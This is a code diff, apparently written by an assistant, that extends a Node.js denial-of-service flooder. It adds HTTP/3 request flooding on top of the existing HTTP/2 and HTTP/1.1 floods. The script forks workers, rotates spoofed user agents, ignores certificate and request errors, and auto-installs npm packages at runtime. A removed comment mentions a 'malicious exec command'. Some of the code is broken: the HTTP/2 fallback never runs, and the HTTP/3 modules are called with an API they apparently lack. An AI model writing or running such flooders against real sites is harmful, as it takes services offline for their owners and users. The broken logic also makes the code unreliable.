@@ -1,11 +1,28 @@
-const requiredModules = ["colors", 'http2', "tls", "cluster", 'set-cookie-parser', "url", "crypto", "user-agents", "random-useragent", "net", 'fs'];
+const requiredModules = [
+  "colors", "tls", "cluster", "url", "crypto", "user-agents", 
+  "random-useragent", "net", "fs", "http2", "set-cookie-parser"
+];
+
+// Add HTTP/3 modules
+const http3Modules = ["http3", "ngtcp2", "nghttp3"];
+requiredModules.push(...http3Modules);
+
 requiredModules.forEach(moduleName => {
   try {
     require.resolve(moduleName);
   } catch (error) {
     console.log("Installing the module " + moduleName + "...");
     const { execSync } = require("child_process");
-    execSync("npm install " + moduleName);
+    try {
+      execSync("npm install " + moduleName, { stdio: 'inherit' });
+    } catch (installError) {
+      console.log("Failed to install " + moduleName + ", trying with build flags...");
+      try {
+        execSync("npm install " + moduleName + " --build-from-source", { stdio: 'inherit' });
+      } catch (e) {
+        console.log("Could not install " + moduleName);
+      }
+    }
   }
 });
 
@@ -19,7 +36,22 @@ const fs = require('fs');
 var colors = require("colors");
 const randomUseragent = require("random-useragent");
 
-// User agents array
+// Try to load HTTP/3
+let http3;
+try {
+  http3 = require("http3");
+} catch (e) {
+  console.log("HTTP/3 not available, falling back to HTTP/2");
+}
+
+let ngtcp2;
+try {
+  ngtcp2 = require("ngtcp2");
+} catch (e) {
+  // Ignore if not available
+}
+
+// User agents array (keeping your existing array)
 const uap = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36", "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko", "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9", "Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4", "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240", "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0", "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko", "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.62", "Mozilla/5.0 (Linux; Android 12; POCO F1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 8.1.0; W-K130-TMV Build/OPM2.171019.012) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 4.4.2; MITO T10 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Safari/537.36", "Mozilla/5.0 (Linux; Android 10; moto g(7) plus Build/QPWS30.61-21-18-7; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 9; SM-G800H Build/PQ3A.190801.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.114 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 9; TECNO AB7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36", "Mozilla/5.0 (Linux; 6.0; Nomi i5010) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 11; moto g stylus 5G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 11; SAMSUNG moto g stylus 5G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36", "Mozilla/5.0 (Linux; U; Android 3.2; en-us; Sony Tablet S Build/THMAS11000) AppleWebKit/534.13 (KHTML, like Gecko) Version/4.0 Safari/534.13", "Mozilla/5.0 (Linux; Android 7.1.1; SM-J510MN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.166 Mobile Safari/537.36 OPR/65.2.3381.61420", "Mozilla/5.0 (Linux; Android 8.0.0; SM-G930R4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36", "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1 Mobile/15E148 Safari/604.1", "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36", "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko", "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/118.0.5993.69 Mobile/15E148 Safari/604.1", "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36", "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36", "Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/112.0.5615.46 Mobile/15E148 Safari/604.1", "Mozilla/5.0 (Linux; Android 11; Infinix X689C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v4504021560267656607 t3426302838546509975 ath1fb31b7a altpriv cvcv=2 smf=0", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v5534684115277472898 t3426302838546509975 ath1fb31b7a altpriv cvcv=2 smf=0", "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Mobile/15E148 Safari/604.1"];
 
 // Other header arrays remain the same
@@ -70,24 +102,75 @@ const args = {
 
 const parsedTarget = new URL(args.target);
 
-if (cluster.isPrimary) {
-  for (let counter = 1; counter <= args.threads; counter++) {
-    console.clear();
-    console.log("ATTACK SENT".bgRed);
-    console.log('TEAM'.blue);
-    cluster.fork();
-  }
-} else {
-  for (let i = 0; i < 10; i++) {
-    setInterval(runFlooder, 0);
-  }
-}
+// HTTP/3 specific configuration
+const http3Options = {
+  maxHeaderSize: 16384,
+  maxHeaderPairs: 128,
+  keepAlive: true,
+  qpackMaxTableCapacity: 65536,
+  qpackBlockedStreams: 128
+};
 
 function randomElement(array) {
   return array[Math.floor(Math.random() * array.length)];
 }
 
-function runFlooder() {
+// HTTP/3 flood function
+async function http3Flood() {
+  if (!http3) return; // Fall back to HTTP/2 if HTTP/3 not available
+  
+  try {
+    const client = http3.connect(parsedTarget.origin, {
+      servername: parsedTarget.hostname,
+      ALPNProtocols: ['h3', 'h3-29', 'h3-28'],
+      rejectUnauthorized: false
+    });
+
+    client.on('connect', () => {
+      console.log("HTTP/3 Connected".green);
+      
+      for (let i = 0; i < args.Rate; i++) {
+        try {
+          const req = client.request({
+            ':method': 'GET',
+            ':path': parsedTarget.pathname || '/',
+            ':authority': parsedTarget.hostname,
+            ':scheme': 'https',
+            'user-agent': randomElement(uap),
+            'accept': randomElement(accept_header)
+          });
+          
+          req.on('response', () => {
+            // Request successful
+          });
+          
+          req.on('error', () => {
+            // Ignore errors
+          });
+          
+          req.end();
+        } catch (e) {
+          // Ignore request errors
+        }
+      }
+    });
+
+    client.on('error', () => {
+      client.close();
+    });
+
+    setTimeout(() => {
+      client.close();
+    }, 5000);
+
+  } catch (error) {
+    // Fall back to HTTP/2
+    runHTTP2Flood();
+  }
+}
+
+// HTTP/2 flood function (existing functionality)
+function runHTTP2Flood() {
   const port = parsedTarget.protocol === "https:" ? 443 : 80;
   
   try {
@@ -105,61 +188,66 @@ function runFlooder() {
 
     socket.on('connect', () => {
       if (parsedTarget.protocol === 'https:') {
-        // HTTPS connection
         const tlsOptions = {
           'socket': socket,
           'host': parsedTarget.hostname,
           'servername': parsedTarget.hostname,
           'rejectUnauthorized': false,
           'secureContext': secureContext,
-          'ALPNProtocols': ['h2', 'http/1.1']
+          'ALPNProtocols': ['h2', 'http/1.1', 'h3'] // Added h3 to ALPN
         };
 
         const tlsSocket = tls.connect(tlsOptions);
         
         tlsSocket.on('secureConnect', () => {
-          // Create HTTP/2 connection directly to target
-          const client = http2.connect(parsedTarget.origin, {
-            'createConnection': () => tlsSocket
-          });
+          // Check if server supports HTTP/3 via ALPN
+          const protocol = tlsSocket.alpnProtocol;
+          if (protocol && protocol.includes('h3') && http3) {
+            // Use HTTP/3 if available
+            http3Flood();
+          } else {
+            // Fall back to HTTP/2
+            const client = http2.connect(parsedTarget.origin, {
+              'createConnection': () => tlsSocket
+            });
 
-          client.on('connect', () => {
-            // Send requests
-            for (let i = 0; i < args.Rate; i++) {
-              try {
-                const req = client.request({
-                  ':method': 'GET',
-                  ':path': parsedTarget.pathname || '/',
-                  ':authority': parsedTarget.hostname,
-                  ':scheme': 'https',
-                  'user-agent': randomElement(uap),
-                  'accept': randomElement(accept_header)
-                });
-                
-                req.on('response', () => {});
-                req.end();
-              } catch (e) {
-                // Ignore errors
+            client.on('connect', () => {
+              for (let i = 0; i < args.Rate; i++) {
+                try {
+                  const req = client.request({
+                    ':method': 'GET',
+                    ':path': parsedTarget.pathname || '/',
+                    ':authority': parsedTarget.hostname,
+                    ':scheme': 'https',
+                    'user-agent': randomElement(uap),
+                    'accept': randomElement(accept_header)
+                  });
+                  
+                  req.on('response', () => {});
+                  req.end();
+                } catch (e) {
+                  // Ignore errors
+                }
               }
-            }
-          });
+            });
 
-          client.on('error', () => {
-            client.destroy();
-            socket.destroy();
-          });
+            client.on('error', () => {
+              client.destroy();
+              socket.destroy();
+            });
 
-          setTimeout(() => {
-            client.destroy();
-            socket.destroy();
-          }, 5000);
+            setTimeout(() => {
+              client.destroy();
+              socket.destroy();
+            }, 5000);
+          }
         });
 
         tlsSocket.on('error', () => {
           socket.destroy();
         });
       } else {
-        // HTTP connection
+        // HTTP connection (unchanged)
         const request = `GET ${parsedTarget.pathname || '/'} HTTP/1.1\r\n` +
                        `Host: ${parsedTarget.hostname}\r\n` +
                        `User-Agent: ${randomElement(uap)}\r\n` +
@@ -187,12 +275,30 @@ function runFlooder() {
   }
 }
 
+// Updated runFlooder to try HTTP/3 first
+function runFlooder() {
+  // Try HTTP/3 first, fall back to HTTP/2
+  http3Flood();
+}
+
+if (cluster.isPrimary) {
+  console.log("HTTP/3 ATTACK SENT".bgRed);
+  console.log('TEAM'.blue);
+  console.log('Using HTTP/3 with fallback to HTTP/2'.yellow);
+  
+  for (let counter = 1; counter <= args.threads; counter++) {
+    cluster.fork();
+  }
+} else {
+  for (let i = 0; i < 10; i++) {
+    setInterval(runFlooder, 0);
+  }
+}
+
 const StopScript = () => process.exit(1);
 setTimeout(StopScript, args.time * 1000);
 
 process.on("uncaughtException", () => {});
 process.on("unhandledRejection", () => {});
 
-// Remove the malicious exec command at the end
-console.log("Attack running without proxies");
-
+console.log("HTTP/3 Attack running");
